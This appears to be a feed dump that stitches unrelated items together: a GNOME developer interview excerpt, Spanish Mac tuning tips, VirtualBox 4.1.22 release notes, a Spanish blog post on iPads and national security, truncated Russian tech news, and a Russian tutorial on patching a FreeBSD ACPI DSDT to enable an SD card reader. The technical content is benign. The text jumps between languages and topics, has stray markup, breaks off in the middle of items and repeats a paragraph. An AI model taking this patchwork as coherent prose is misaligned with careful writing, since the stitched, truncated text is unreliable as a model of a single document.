The collaboration with distribution makers is going well according to Peters: “All major distributions will be shipping GNOME 3. Even Debian with its focus on “when it’s ready” has 3.4 in their repository and will ship it in the next release, Wheezy.” But Peters admits that some things could be better, such as the collaboration with Ubuntu: “It’s a bit of a difficult position, as we were really close a couple of years ago. Ubuntu adopted our release schedule and it was a really nice distribution to try the development versions. Nowadays, they are not in an easy spot. They still do rely on many GNOME components, but their primary environment is now Unity; at the same time they still have their schedule tightly coupled to GNOME. Perhaps this should change, so they have more time to absorb the changes that are made in GNOME.” 
The GNOME developers primarily focus on running on GNU/Linux, but other open source operating systems are not left in the cold, Peters says: “We regularly get patches to improve the way GNOME works on *BSD, and they’re usually committed quite fast. For instance, the last one I noticed was about allocating pseudo-TTYs required for SSH authentication. A patch was committed that uses the openpty(3) function on OpenBSD.” 
Although running GNOME on non-Linux operating systems is becoming more difficult because of the growing dependency on the Linux-only systemd component, Peters clarifies that systemd is not a hard dependency: “Mostly we have a dependency on a few D-Bus interfaces, for instance to change the date/time or the hostname, but these are easy to reimplement as standalone programs. Ubuntu did this already in the ubuntu-system-service package, so *BSD systems should also be able to do it. Then there’s session tracking, done by systemd-logind, but it’s still possible to use ConsoleKit for it, which is maintained now by Canonical’s Martin Pitt.” 
Of course the GNOME developers are also collaborating with KDE on cross-desktop and Freedesktop.org topics, such as systemd and NetworkManager. “Another successful example is the Telepathy framework for instant messaging and voice/video calling: it was originally developed for GNOME (with Empathy as the canonical client), but it’s now adopted by KDE too. But the best example of cross-desktop collaboration at the moment may be the new Secret Service D-Bus API, which is implemented by both gnome-keyring and ksecretservice.”

  <title><![CDATA[Vuelta al cole: cómo poner a punto tu Mac para la nueva temporada]]></title>
  <summary><![CDATA[Este post está extraido de http://www.applesfera.com 
 
  Seguimos con la vuelta al cole, y si hoy eran los chavales los que volvían a pisar el suelo de los temidos colegios, nuestros Macs tampoco se salvan de la puesta a punto para la nueva temporada. Y es que todo equipo necesita cierta puesta a punto por muy bien que funcione, y que esta es la clave para mantener un sistema sin problemas durante bastante tiempo. Aquí tienes cinco sencillos trucos que te ayudaran a conseguir el máximo rendimiento de tu equipo.  
 
Trucos para mejorar el rendimiento de OS X
¿Básicos? No, imprescindibles. Y es que muchas veces nos dedicamos a usar complejos programas de mantenimiento en nuestro Mac cuando en realidad operaciones mucho más sencillas pueden aportarnos un resultado mucho más notable, es el caso de estas: 

Elimina archivos del Escritorio. No me cansaré de decirlo una y otra vez (y por desgracia me encuentro esta situación casi a diario), el Escritorio no es un cajón desastre, para eso son las carpetas del sistema. Y es que todo icono/archivo alocado en el Escritorio del sistema mantiene una previsualización del mismo en RAM y a mayor sea el número, mayor será el consumo de recursos de algo que apenas tiene sentido. Tampoco hay que olvidar el lastre que supone dicho comportamiento para el arranque del sistema, de nuevo algo sin sentido. Pero cuidado, este “problema” tampoco se soluciona en su totalidad creando una carpeta en el escritorio donde arrastrar todos los archivos, eso se llama ser organizado, pero no vamos a ayudar a nuestro equipo de ninguna forma. ¿Lo mejor? Hacer uso de las carpetas del sistema para ello y si quieres un acceso rápido a alguna de esas carpetas “desastre” simplemente crea un acceso directo en el Dock desde el cual navegar por los archivos y abrirlos de forma rápida.

 

Ordena los archivos de tu ordenador. Yo soy el primero que se dedica a acumular archivos sin ningún sentido en mi Mac pero hay que ser coherente, un sistema de archivos sin orden, es un ordenador mucho más complicado de usar. Cada persona tiene sus propias peculiaridades a la hora de entender la mejor forma de organizar las cosas, por eso únicamente te dejaré los enlaces a cuatro entradas imprescindibles sobre el tema que te pueden aportar alguna idea nueva. Dos sencillos trucos para mantener tu ordenador organizado, Cinco atajos y modificaciones imprescindibles para el Finder, Carpetas inteligentes, cómo trabajar con ellas en Mac OS X, Screencast: organiza de forma automática tu carpeta de Descargas.

 

Actualización de aplicaciones. Con la llegada de la Mac App Store y las actualizaciones de las aplicaciones y sistema integrado en dicha utilidad, ahora es mucho más sencillo mantener nuestro ordenador y sus aplicaciones al día y actualizadas a la última versión. El problema es que las aplicaciones que no hayan sido compradas en la tienda, o descargadas de otras fuentes, no podrán beneficiarse de dicha mejora. Recuerda que tienes otras alternativas como AppFresh, una aplicación capaz de realizar un listado de todas tus aplicaciones y actualizar las mismas a la última versión de forma idéntica a como lo hace la Mac App Store.

 

Puesta a punto del sistema. Uno de los mejores secretos de un sistema operativo basado en BSD o OpenBSD como OS X es la poca degradación del mismo cuando se encuentra abierto y funcionando por días, semanas o meses. Esto se debe a que el sistema realiza de forma periódica y automática operaciones de mantenimiento básicas que eliminan archivos de cache innecesarios, bases de datos prescindibles, logs y otros archivos temporales. El sistema realiza dicha operación de forma diaria, aunque para ello debe de estar el ordenador funcionando, si quieres forzar la ejecución de dichos scripts de forma manual, únicamente debes de ejecutar este comando desde el Terminal: sudo periodic daily weekly monthly. No existe ningún tipo de confirmación visual, así que sabrás que el comando ha terminado cuando el terminal finalice el proceso. Recuerda que si usas programas como ONYX no tendrás que realizar dicha tarea, ya que ese tipo de programas ejecutan de forma automática este comando.

 

Comprueba el estado de tu Hardware. Y es que un ordenador en plena “temporada” es como un coche antes de salir de vacaciones, además de la puesta a punto necesitamos que todo está funcionando de forma correcta. La parte más sensible de nuestro equipo es su disco duro, y es que si se estropea cualquier otro componente del ordenador, nuestro equipo dejará de funcionar, pero si perdemos nuestro HDD además perderemos toda nuestra información personal. La forma más sencilla de comprobar el estado de nuestro disco duro es usar la Utilidad de Discos, desde ella podrás realizar una verificación de la partición/disco duro para comprobar que la estructura de archivos es correcta y al mismo tiempo la integridad física del disco.

  <title><![CDATA[VirtualBox 4.2.0 Build 80667 RC4]]></title>
  <summary><![CDATA[VirtualBox is a general-purpose full virtualizer for x86 hardware. Targeted at server, desktop and embedded use, it is now the only professional-quality virtualization solution that is also Open Source Software. VirtualBox is a powerful x86 virtualization product for enterprise as well as home use. Not only is VirtualBox an extremely feature rich, high performance product for enterprise customers, it is also the only professional solution that is freely available as Open Source Software under the terms of the GNU General Public License. Presently, VirtualBox runs on Windows, Linux, Macintosh and OpenSolaris hosts and supports a large number of guest operating systems including but not limited to Windows (NT 4.0, 2000, XP, Server 2003, Vista, Windows 7), DOS/Windows 3.x, Linux (2.4 and 2.6), Solaris and OpenSolaris, and OpenBSD. VirtualBox is being actively developed with frequent releases and has an ever growing list of features, supported guest operating systems and platforms it runs on.
 

Some of the features of VirtualBox are: • Modularity. VirtualBox has an extremely modular design with well-defined internal programming interfaces and a client/server design. This makes it easy to control it from several interfaces at once: for example, you can start a virtual machine in a typical virtual machine GUI and then control that machine from the command line, or possibly remotely. VirtualBox also comes with a full Software Development Kit: even though it is Open Source Software, you don’t have to hack the source to write a new interface for VirtualBox. • Virtual machine descriptions in XML. The configuration settings of virtual machines are stored entirely in XML and are independent of the local machines. Virtual machine definitions can therefore easily be ported to other computers. • Guest Additions for Windows and Linux. VirtualBox has special software that can be installed inside Windows and Linux virtual machines to improve performance and make integration much more seamless. Among the features provided by these Guest Additions are mouse pointer integration and arbitrary screen solutions (e.g. by resizing the guest window). • Shared folders. Like many other virtualization solutions, for easy data exchange between hosts and guests, VirtualBox allows for declaring certain host directories as “shared folders”, which can then be accessed from within virtual machines.

A number of extra features are available with the full VirtualBox release only (see the “Editions” page for details): • Virtual USB Controllers. VirtualBox implements a virtual USB controller and allows you to connect arbitrary USB devices to your virtual machines without having to install device specific drivers on the host. • Remote Desktop Protocol. Unlike any other virtualization software, VirtualBox fully supports the standard Remote Desktop Protocol (RDP). A virtual machine can act as an RDP server, allowing you to “run” the virtual machine remotely on some thin client that merely displays the RDP data. • USB over RDP. With this unique feature, a virtual machine that acts as an RDP server can still access arbitrary USB devices that are connected on the RDP client. This way, a powerful server machine can virtualize a lot of thin clients that merely need to display RDP data and have USB devices plugged in.

Changes in VirtualBox 4.1.22 (released 2012-09-07): * VMM: fixed a potential host crash triggered by shutting down a VM when another VM was running (only affected 32-bit hosts and 64-bit OS X hosts, 4.1 regression, bug #9897) * VMM: fixed a potential host crash under a high guest memory pressure (seen with Windows 8 guests) * VMM: respect RAM preallocation while restoring saved state. * VMM: fixed handling of task gates if VT-x/AMD-V is disabled * Storage: fixed audio CD passthrough for certain media players * USB: don’t crash if a USB device is plugged or unplugged when saving or loading the VM state (SMP guests only) * RTC: fixed a potential corruption of CMOS bank 1 * Mac OS X hosts: installer fixes for Leopard (4.1.20 regression) * Windows Additions: fixed memory leak in VBoxTray (bug #10808)

  <title><![CDATA[Tablets y seguridad nacional]]></title>
  <summary><![CDATA[Hace casi un año posteé sobre la necesidad y conveniencia de dotar a cada diputado español con un ipad: ¿Qué necesitan nuestros diputados? 
 
En aquella entrada cuestiono la conveniencia de usar dispositivos para usuarios finales debido a distintos problemas, y el que más me preocupaba es el de la seguridad. Seguridad de los datos (no optimizada debido a que el iPad no se diseñó con la seguridad corporativa como objetivo esencial), y seguridad nacional. 
 
Hay que recordar otra vez que, al menos, parte de los diputados y la totalidad de los ministros manejan datos sensibles respecto a la seguridad nacional. No es sólo que un ministro pueda perder un iPad con datos sobre ETA. No, el problema es que en un iPad hubiera datos sensibles sobre ETA. 
 
El iPad es un dispositivo ultra-privativo. Esto es, va más allá del concepto de producto privativo, de producto del que no conocemos el código fuente. En este caso, además, el usuario no tiene acceso a partes significativas de las funcionalidades del dispositivo (sistema de archivos, p.e.). Un producto privativo puede tener sentido para la seguridad nacional si hay un acuerdo funcional y operativo entre el fabricante y los responsables de la seguridad nacional, como ocurre entre Microsoft y el CNI. 
 
Sigo pensando que es mejor que los datos sensibles se manejen sólo en dispositivos de fuente abierta y completamente auditada, pero un acuerdo al menos demuestra una preocupación razonable y profesional sobre los datos más sensibles para la seguridad nacional. 
 
La noticia que he pegado sobre la pérdida del iPad del ministro del interior sorprende poco. Somos así. La cultura de la seguridad digital no entra en la cabeza de nuestros líderes y decisores porque es algo de frikis, tendemos a pasar de todo y nos orgullece nuestra chapuza. Bueno, les orgullece. Algo así es impensable en un país más ordenado, o en un país cuya élite haya hecho de la paranoia un arte desde tiempos zaristas. 
 
Y así, en Rusia van por el camino lógico y, para ellos, inevitable: para funcionarios de cierto nivel no va a haber iPad como dispositivo oficial, sino un tablet endurecido (apto para toda clase de chistes sobre "en la Rusia Soviética...") a nivel de hardware... y a nivel de software. Leo en el Androide Libre que han presentado en el IFA de Berlín a ROMOS, su variante de Android expurgada de presencia Google. 
 
Y les doy un voto de confianza. La ex-unión soviética produce algunos de los mejores hackers y crackers del mundo, gracias a su nivel académico. Y como digo, la paranoia es algo que se respira, algo inconsciente e inevitable. Si han dedicado 5 años a auditar el código de Android para evitar puertas traseras, les puede haber funcionado. 
 
Pero vaya, lo absurdo sería asumir que, a renglón seguido, no han dejado su puertecica para husmear a modo. O sea, que si hay que asumir que un iPad tiene una backoriffice a disposición de agencias americanas, el ROMOS tiene escuchando a un ruso sí o sí. 
 
Pero es una lección magnífica. Datos sensibles. Seguridad nacional. Dispositivo para acceder a ellos. 
 
No es tan difícil. Y es plenamente exigible que se acceda a dichos datos con una protección adecuada contra las miradas y fisgoneos de terceros. No es sólo que el escolta esté ojo avizor ante los despistes de ministros. 
 
No, ROMOS es un ejemplo que saca los colores a nuestros políticos, que no sólo no entienden las necesidades de seguridad de los dispositivos que manejan debido a sus cargos, sino que no dejan hacer su trabajo a quien sí las entiende. 
 
Pese a la crisis, me parece evidente que España necesita un equivalente al ROMOS. Si auditar el código de Android es un esfuerzo inviable a corto plazo, se puede tirar de un código auditado desde hace mucho más tiempo. Linux u OpenBSD, por citar dos ejemplos. A partir de ahí, lo suyo sería construir el ecosistema mínimo con el que el político puede hacer su trabajo: un lector de PDF, un navegador ligero, y quizás un editor de textos o un cliente de email. 
 
Quizás, porque muchos de ellos siguen dictando correos y documentos de la misma manera que usan coches oficiales: para demostrar status. Y no, no exagero en absoluto. He sido testigo de ello :) 
 
Lo malo es que la moda es mucha moda, la ignorancia es todopoderosa y nuestros políticos pasan de todo. ROMOS es impensable en España, porque se puede meter un iPad dentro de una funda Louis Vutton para olvidarlo en una cafetería. Al menos, la cooperación hispanonorteamericana será impecable (para ellos): gracias a los iPad, sólo tendrán que fingir que escuchan la información que les proporcionamos, porque ya dispondrán de ella por adelantado. Al fin y al cabo, son nuestros aliados y sus agencias califican nuestra deuda.]]></summary>

Все мы работаем с компьютером и порой не замечаем на чем же мы сидим.

Posted: 05 Sep 2012 03:57 AM PDT   В то время как поклонники и ненавистники Delphi ломают копья по поводу, недавно анонсированной, версии XE3, ребята из команды Lazarus 29 августа объявили о выходе Lazarus 1.0.    Для тех кто не в курсе, Lazarus — это IDE и набор классов для FreePascal, который эмулируют Delphi. Проект был открыт в далеком 1999 году усилиями трёх разработчиков: Cliff Baeseman, Shane Miller и Michael A. Hess. История более детально описана в Wiki.

Довелось поработать со стороны заказчика и со стороны исполнителя, а также изучить опыт организации взаимодействия государства и бизнеса в США.      В разделе о краткой истории вопроса текущей статьи будет рассказано про то, когда был принят закон о госзакупках и с чем было связано его принятие.  В разделе о процессе типичной госзакупки будет описан процесс покупки партии из 100 ноутбуков, описана процедура закупа и описаны некоторые проблемы, которые могут возникнуть.  В разделе про закупку в рамках сложного проекта будет описан процесс закупки дорогостоящего медицинского оборудования – магнитно-резонансного томографа, подготовка проекта и помещений под оборудование, а также проблемы, которые часто возникают в подобных сложных проектах, но которые не учитывает законодательство о госзакупках.  Будут даны небольшие соображения по улучшению законодательства в области госзакупок, которые проистекают из текущих проблем и зарубежного опыта.  Будут описаны некоторые законные способы обхода действующего законодательства о госзакупах и даны некоторые полезные ссылки в заключении этой статьи.    Нервных попрошу не смотреть.

Часть первая, историческая    Posted: 05 Sep 2012 02:45 AM PDT    В жизни каждого ребенка когда-нибудь обязательно наступает первое сентября – дата, отделяющая вольницу различной степени беззаботности от ученических будней. В школе ребенку предстоит изучать множество предметов, но в этом блоге, что логично, нам более всего интересна информатика. Давайте по случаю дня знаний, хоть и с небольшим опозданием, вспомним учебные компьютеры нашего школьного детства, а после, в следующем посте, поговорим о дне сегодняшнем – какие устройства можно увидеть в классе сейчас и о чем там рассказывают.

Такой чип (а именно, PCI7411) стоит и в моей NEC Versa S950. Этот малоизвестный ноутбук я в свое время предпочел даже ThinkPad-серии практически исключительно из-за более лучшей поддержки FreeBSD (оборудования в целом и спящего режима в частности) — специально тестировал в новосибирском Техносити перед покупкой. Долгое время я не пользовался встроенным кард-ридером, по привычке обходясь USB'шными «свистками». Но недавно я обнаружил, что FreeBSD до сих пор его не поддерживает. И если лет пять-шесть назад это можно было объяснить отсутствием нормального драйвера для этих контроллеров (нужно было что-то скачивать и собирать самому), теперь я точно знал, что они «из коробки» поддерживаются во FreeBSD драйвером sdhci(4), о чем прямо сказано на странице руководства (и позже подтвердилось чтением исходников).    Я начал неспешно гуглить на эту тему, и картина стала вырисовываться невеселая. Оказалось, что таких «счастливчиков», как я, немало. Многие постили в рассылки и форумы «портянки» dmesg и pciconf -lv, заводили баги в трекерах (например, OpenBSD PR i386/5843), но решения никто не предлагал. Более того, фактически поставив точку в вопросе, Александр Мотин, автор драйвера sdhci(4), в 2010 г. написал на форуме, что-де TI документацию на чип не дают, а значит, если производитель сконфигурировал чип неверно, а его настройка через BIOS не предусмотрена, сделать что-либо затруднительно. В свою очередь, Theo de Raadt закрыл i386/5843 с словами «We do what we can. This vendor, amongst other, have their sdhc controllers locked out and hidden behind little undocumented bits. We've strugged before to find this information, and failed. If you can find this information on some other operating system, or in some vendor documentation, we would be thrilled.».

Опираясь на него, мне и моим коллегам удавалось приводить в порядок самый страшный код, объединять в команде малосовместимых программистов и годами поддерживать системы без лишнего нытья.

К сожалению, в том плагине, о котором речь пойдет ниже, часть «shift» употреблена неверно, в нем используется лишь тилт.  Тилт — это наклон объектива, который приводит к изменению плоскости резкости, по этой причине и возникает эффект, достигаемый этим плагином. Но, как я уже сказал, никакого шифта тут нету.    Существовало множество решений для этого — от плагинов для Photoshop и фильтра в Instagram до отдельных программ.    От переводчика: на мой взгляд, данный плагин является великолепным примером для демонстрации возможностей фильтров в CS33    Встречайте: tiltShift.js!  Это плагин для jQuery, который использует фильтры на CSS3 для создания tilt-эффекта. Это всего лишь «proof of concept» и работает только в Chrome & Safari 6.    На странице плагина можно глянуть примеры (с оригиналами фотографий).

Само собой, в России такая борьба также ведется. Сейчас Министерство культуры РФ уже подготовило проект закона, который возлагает ответственность за контрафактную продукцию, если так можно выразиться, на операторов связи и на администраторов сайтов. Так что приписка «администрация сайта не несет ответственности за материалы, размещаемые пользователями» станет еще более бесполезной, чем раньше.

Сборщик мусора перейдёт от стратегии «stop-the-world», когда на время уборки полностью замораживается работа скриптов, к инкрементальной стратегии, когда сборка мусора происходит в несколько этапов. Хотя в целом работа сборщика мусора будет отнимать немного больше времени, отзывчивость браузера существенно улучшится, так как элементы интерфейса, анимация и игры не будут больше подвисать на несколько сотен миллисекунд на время уборки.

Это первые аппараты с предустановленной Windows Phone 8 и первые Nokia с поддержкой беспроводной передачи энергии. Для зарядки аппаратов нет необходимости подключать шнур — их достаточно положить на небольшой коврик и они автоматически начнут заряжаться. По предварительным данным беспроводная зарядка входит в комплект поставки, однако, в официальных спецификациях её обнаружить не удалось.        Lumia 920 — новый флагман линейки. Nokia подчеркивает впервые реализованную в нём технологию PureView, позволяющую стабилизировать трясущееся изображение и получить четкий снимок, даже в условиях плохой освещенности. Также широко освещается и новая технология дисплея Nokia PureMotion HD+, обещающая сверхчёткое изображение и быстрый отклик экрана, что позволит избежать «замыливания» динамичных изображений. Занятно и то, что экран Lumia 920 способен реагировать на прикосновение в перчатке и даже ключами.

Единственное требование от издателя таких хитов как Assassin's Creed и Far Cry 2 будет заключаться в том, что игра должна будет единожды пройти активацию на серверах Ubisoft, после чего она будет считаться легитимной и не требовать более никаких манипуляций для её запуска.     Источник      Игры операторов связи с огнем: за что и как штрафует ФАС    Posted: 05 Sep 2012 07:24 AM PDT  Некоторое время назад наше внимание приковали к себе «мелкие шрифты» в рекламных обещаниях операторов. Спустя год мы решили возобновить изучение маркетинговых практик коллег, однако постепенно ушли в другую сторону.     Толчок к новой порции разбора чужих ошибок был дан недавним делом Федеральной антимонопольной службы против Ростелекома – компания использовала слово «безлимитный» в тарифе, с ограничением скорости после превышения пользователем определенного объема трафика. Такая практика популярна у региональных операторов, а также операторов сотовой связи в тарифах на мобильный интернет.     В отрытой базе ФАС жалобы и предписания в области связи можно поделить на три категории:    1.

  <title><![CDATA[[хабр] Настройка оборудования на раннем этапе загрузки средствами ACPI (на примере FreeBSD)]]></title>
  <summary><![CDATA[Интересная статья с хабра о поиске и портировании линухового драйвера. В связи с планируемым неспешным переездом на FreeBSD было решено полностью скопировать и сохранить данную статью. Итак, 

Настройка оборудования на раннем этапе загрузки средствами ACPI (на примере FreeBSD)

Несколько лет назад, когда CardBus и FireWire (IEEE 1394) еще были относительно «в ходу», многие производители ноутбуков в своей продукции использовали контроллеры семейства PCIXX21 и PCIXX11 фирмы Texas Instruments: один небольшой чип обеспечивал поддержку не только упомянутых интерфейсов, но и многих популярных стандартов сменных карт памяти. 

Такой чип стоит и в моей NEC Versa S950. Этот малоизвестный ноутбук я в свое время предпочел даже ThinkPad-серии практически исключительно из-за более лучшей поддержки FreeBSD (оборудования в целом и спящего режима в частности) — специально тестировал в новосибирском Техносити перед покупкой. Долгое время я не пользовался встроенным кард-ридером, по привычке обходясь USB'шными «свистками». Но недавно я обнаружил, что FreeBSD до сих пор его не поддерживает. И если лет пять-шесть назад это можно было объяснить отсутствием нормального драйвера для этих контроллеров (нужно было что-то скачивать и собирать самому), теперь я точно знал, что они «из коробки» поддерживаются во FreeBSD драйвером sdhci(4), о чем прямо сказано на странице руководства (и позже подтвердилось чтением исходников). 

Я начал неспешно гуглить на эту тему, и картина стала вырисовываться невеселая. Оказалось, что таких «счастливчиков», как я, немало. Многие постили в рассылки и форумы «портянки» dmesg и pciconf -lv, заводили баги в трекерах (например, OpenBSD PR i386/5843), но решения никто не предлагал. Более того, фактически поставив точку в вопросе, Александр Мотин, автор драйвера sdhci(4), в 2010 г. написал на форуме, что-де TI документацию на чип не дают, а значит, если производитель сконфигурировал чип неверно, а его настройка через BIOS не предусмотрена, сделать что-либо затруднительно. В свою очередь, Theo de Raadt закрыл i386/5843 с словами «We do what we can. This vendor, amongst other, have their sdhc controllers locked out and hidden behind little undocumented bits. We've strugged before to find this information, and failed. If you can find this information on some other operating system, or in some vendor documentation, we would be thrilled.». 

В отчаянии я загрузился с Ubuntu LiveCD. И очень удивился тому, что в Linux кард-ридер работает. Значит… 

Плохо гуглил
Оказывается, еще в 2006 г. Алекс Дубов написал Linux-драйвер для TI FlashMedia ридеров. Я скачал исходники и принялся их изучать, надеясь впоследствии доработать sdhci(4) или даже спортировать драйвер целиком. В первую очередь я посмотрел список поддерживаемых PCI vendor/device ids, чтобы сравнить с «нашим» драйвером. Он оказался небольшим: 

$ cat linux/pci_ids.h
#define PCI_VENDOR_ID_TI  0x104c
#define PCI_DEVICE_ID_TI_XX21_XX11_FM 0x8033
#define PCI_DEVICE_ID_TI_XX12_FM 0x803b
#define PCI_DEVICE_ID_TI_XX20_FM 0xac8f

Число 0x8033 мне уже знакомо по выводу pciconf -lv на моем ноуте: 


    none3@pci0:6:7:3: class=0x018000 card=0x83191033 chip=0x8033104c rev=0x00 hdr=0x00
    vendor     = 'Texas Instruments (TI)'
    device     = 'PCIxx11/21 Integrated FlashMedia Controller'
    class      = mass storage


Это тот самый кард-ридер, который не работает во FreeBSD, но работает в Linux. А вот кусок кода из sdhci.c (FreeBSD): 

static const struct sdhci_device {
 uint32_t model;
 uint16_t subvendor;
 char *desc;
 u_int quirks;
} sdhci_devices[] = {
 { 0x08221180,  0xffff, "RICOH R5C822 SD",
     SDHCI_QUIRK_FORCE_DMA },
 { 0xe8221180,  0xffff, "RICOH SD",
     SDHCI_QUIRK_FORCE_DMA },
 { 0xe8231180,  0xffff, "RICOH R5CE823 SD",
     SDHCI_QUIRK_LOWER_FREQUENCY },
 { 0x8034104c,  0xffff, "TI XX21/XX11 SD",
     SDHCI_QUIRK_FORCE_DMA },

Можно заметить, что идентификатор устройства TI XX21/XX11 SD (0x8034104c) похож на мой (0x8033104c) с точностью до одной цифры. Кроме того, я обратил внимание, что контроллеры CardBus (0x8031104c) и FireWire (0x8032104c) не просто имеют схожие id'шки, но и PCI-селекторы всех устройств отличаются только номером функции, а устройство у них у всех одно и то же: 

none1@pci0:6:7:0: class=0x060700 card=0x83191033 chip=0x8031104c rev=0x00 hdr=0x02
    vendor     = 'Texas Instruments (TI)'
    device     = 'PCIxx21/x515 Cardbus Controller'
    class      = bridge
    subclass   = PCI-CardBus
none2@pci0:6:7:2: class=0x0c0010 card=0x83191033 chip=0x8032104c rev=0x00 hdr=0x00
    vendor     = 'Texas Instruments (TI)'
    device     = 'OHCI Compliant IEEE-1394 FireWire Controller'
    class      = serial bus
    subclass   = FireWire

Вспомнив слова Саши Мотина о том, что чип на самом деле реализует оба контроллера (SDHCI и FlashMedia), я стал искать более целенаправленно, и вскоре наткнулся на еще один пост, а затем на сообщение в рассылке freebsd-mobile@ о похожей (но немного другой) проблеме на HP NC6220. Рабочее решение нигде не предлагалось, но, в отличие от большинства дискуссий, которые сводились к дурацким советам типа «попробуйте последнюю версию драйвера» или банальным «сожалею, но, похоже, вы в пролете», теперь, по крайней мере, стало понятно, что конфигурация чипа как-то отображается в дампе PCI function, а значит, возможно, ее получится поменять; а главное, что таки-доступна документация: PCIXXX21/PCIXXX11 Implementation Guide. И вот тут мне стало по-настоящему интересно. 

Забегая вперед, скажу, что удивительнее всего то, что люди, раскопав практически datasheet на «капризный» чип, останавливались в шаге от решения проблемы. Я так и не нашел ни у кого рецепта, как правильно воспользоваться документацией (что и побудило меня написать этот пост). Но обо всем по-порядку. 

PCIXXX21/PCIXXX11 Implementation Guide — документ о 117 страницах для проектировщиков аппаратуры на базе этих контроллеров. Подробно его разбирать смысла не имеет; самое важное, что я из него почерпнул: контроллер действительно реализует пять функций: CardBus, 1394, FlashMedia, SD Host и SmartCard; начальная конфигурация обычно берется из EEPROM. Главный регистр конфигурации — General Control Register (раздел 12.4.28, с. 65) — находится по адресам 1Eh-1Fh в ROM (нас интересует только нулевой байт, т.к. именно там маскируются функции чипа) и соотвествует PCI offset 86h нулевой функции устройства. Теперь —  

За дело

Для начала посмотрим, что нам скажет утилита pciconf(8) про PCI configuration space «головной» (нулевой) функции чипа, т.е., в терминологии FreeBSD, селектора pci0:6:7:0. Ради краткости я не буду приводить дамп всех 256 байт, а ограничусь лишь интересующим нас, по смещению 86h): 

# pciconf -rb pci0:6:7:0 0x86
d3

Интересно. Смотрим в табличку на 65-й странице pdf'ки, видим, что тройка в нижнем нибле (полубайте) равна типичному значению бит, отвечающих за top level arbitration, SmartCard socket power control и OHCI 1394, это нас мало интересует. А вот верхний нибл как раз маскирует (включает-выключает) логику остальных контроллеров (таблицу целиком не привожу опять же из-за экономии места): 

 

0xD это 1101, т.е. установлены биты DISABLE_SC, DISABLE_SD и DISABLE_SKTB, а бит DISABLE_FM сброшен. Следовательно, чтобы «оживить» контроллер SD Host, нам, по логике, надо сбросить DISABLE_SD (разрешить), а DISABLE_FM, напротив, выставить (запретить). Маске 1011 соответсвует значение 0xB, т.е. по сути, нам надо поменять байт 0xD3 на 0xB3. Проблема, однако, в том, что сделать это нужно сильно заранее, до того, как чип будет проинициализирован, вернее, до того, как он определит, какие контроллеры включать. После того, как система загрузилась, менять конфигурацию бесполезно: все устройства уже «в строю». И вот тут нам на помощь приходит 

ACPI

Что такое ACPI и для чего оно нужно, я объяснять не стану; это выходит за рамки топика; к тому же, на Хабре уже был хороший пост на эту тему. В данном случае нам важен вопрос: можно ли пропатчить DSDT до инициализации чипа так, чтобы он включил нужный контроллер (SD Host) и выключил ненужный, для которого у нас нет драйвера (FlashMedia). 

Посмотрим, какие у нас есть средства отладки и вывода информации с рамках интерпретатора («виртуальной машины») ACPI. В спецификации ACPI (параграф 19.5.25, с. 733) упоминается специальный объект Debug, который операционная система должна «донести» до пользователя. Во FreeBSD за это отвечает системная переменная debug.acpi.enable_debug_objects, которую нужно выставить в единицу: 

# sysctl debug.acpi.enable_debug_objects=1
debug.acpi.enable_debug_objects: 0 -> 1

Теперь мы можем писать произвольные строчки в Debug, а ядро FreeBSD будет выводить их на консоль. Осталось придумать, как заставить ACPI выдавать интересующую нас информацию по требованию. Для начала сдампим и дизассемблируем DSDT ноута, и поизучаем его: 

# acpidump -dt > s950.asl

Я решил найти метод, который вызывается через какое-либо внешнее воздействие (или внутреннее, но периодическое, типа опроса батарейки), при этом практически не затрагивая работу «железа». Изучая код DSDT, я наткнулся на любопытный кусок: 

Method (_Q0C, 0, NotSerialized)
{
    If (\_SB.PCI0.PEGA)
    {
        \_SB.PCI0.PEGP.VGA.SWIH ()
    }
    Else
    {
        Store (0x01, TLST)
        HKDS (0x0A)
    }
}

Больше нигде метод \_SB.PCI0.PEGP.VGA.SWIH не вызывается, а его название намекает, что это переключение дисплея. На клавиатуре многих ноутбуков есть клавиша F4, дополнительная Fn-функция которой как раз должна переключать видео-вывод с внутреннего дисплея на внешний. Попробуем модифицировать код метода следующим образом: 

                     Method (_Q0C, 0, NotSerialized)
                     {
+                        Store ("Fn-F4 pressed", Debug)
                         If (\_SB.PCI0.PEGA)
                         {

Пересоберем ASL: 

# iasl s950-patched.asl
# cp /tmp/acpidump.aml /root/s950-patched.aml

Чтобы FreeBSD использовала нашу таблицу при загрузке, добавим в /boot/loader.conf следующие строчки: 

acpi_dsdt_load="YES"
acpi_dsdt_name="/root/s950-patched.aml"

Если все сделано правильно и наш расчет оправдался, то при нажатии на Fn-F4 мы будем видеть на консоли сообщения ядра (повышенной яркости) о том, что клавиша Fn-F4 была нажата. Теперь, когда мы более-менее умеем взаимодействовать с ACPI, самое время попробовать 

Достучаться до регистра 86h

Физические адресные пространства всевозможных устройств (оперативная память, порты ввода-вывода, платы расширения, CMOS, IPMI и пр.) отображаются в пространство имен ACPI в виде т.н. операционных регионов (OperationRegion), внутри которых обычно выделяются битовые поля (Field), состоящие из одного или нескольких поименованных «виртуальных регистров», или field units (параграф 19.5.96, с. 782 спецификации). OperationRegion для нашего контроллера может выглядеть, например, так: 

OperationRegion (PCIC, PCI_Config, 0x00, 256)
Field (PCIC, AnyAcc, NoLock, Preserve)
{
 Offset (0x86),  // General Control Register по смещению 86h
 TLA, 2,  // Top level arbitration
 SCSP, 1,  // SmartCard socket power
 OHCI, 1,  // Disable OHCI 1394 controller function
 SKTB, 1,  // Disable CardBus socket B
 FM,  1,  // Disable FlashMedia function
 SD,  1,  // Disable SD host controller function
 SC,  1,  // Disable SmartCard function
}

Или даже проще, если объявить не все 256 байт, а только интересующий нас, и не выделять отдельные биты в конфигурационном регистре: 

OperationRegion (PCIC, PCI_Config, 0x86, 0x01)
Field (PCIC, AnyAcc, NoLock, Preserve)
{
 GCR0, 8,  // General Control Register (Byte 0)
}

Нетрудно заметить, что само по себе такое определение бесполезно: оно не привязано к какому-либо устройству, являясь по сути просто структурой из одного байта по известному смещению. Устройства в DSDT задаются через ключевое слово Device (параграф 19.5.30, с. 735); совокупность всех устройств представляет собой этакое дерево. Так, все PCI-устройства находятся чаще всего внутри пространства \_SB.PCI0, которое соответствует корневой шине PCI (чаще всего такая шина одна, но теоретически их может быть до 256 в одном PCI-домене). 

Для идентификации устройства на шине нужно задать его адрес в виде (device << 16) | function. В нашем случае (помните вывод pciconf -lv?) function = 0, device = 7, bus = 6. То есть устройство, видимо, должно выглядеть как-то так: 

Device (XX11)
{
 Name (_ADR, 0x00070000)  // pci0:6:7:0
}

Хорошо, но откуда взялась шестая шина? И где она в DSDT? Посмотрим лог загрузки ядра (dmesg): 

